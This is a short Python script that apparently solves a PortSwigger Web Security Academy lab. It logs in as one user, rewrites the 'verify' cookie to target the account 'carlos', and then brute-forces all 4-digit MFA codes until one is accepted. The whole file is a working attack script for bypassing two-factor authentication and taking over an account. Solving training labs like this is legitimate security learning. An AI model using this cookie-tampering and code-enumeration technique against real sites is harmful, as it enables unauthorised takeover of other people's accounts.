import requests
import itertools
import bs4
session = requests.Session()

url = "https://0af000d303ddd5c28026da3b00eb005b.web-security-academy.net/login"
data = {"username": "wiener", "password": "peter"}
r = session.post(url, data=data)
url = "https://0af000d303ddd5c28026da3b00eb005b.web-security-academy.net/login2"
session.cookies.set("verify", "carlos")
combinations = itertools.product('0123456789', repeat=4)
for combo in combinations:
    code = ''.join(combo)
    data["mfa-code"] = code
    r = session.post(url, data=data)
    soup = bs4.BeautifulSoup(r.text, features="html.parser")
    page = soup.find_all('p', class_='is-warning')
    text = ""
    for p in page:
        text = p.text
    if text  == "Incorrect security code":
        print(f"Incorrect security code {code}")
    else:
        print(f"Find security code {code}")
        break
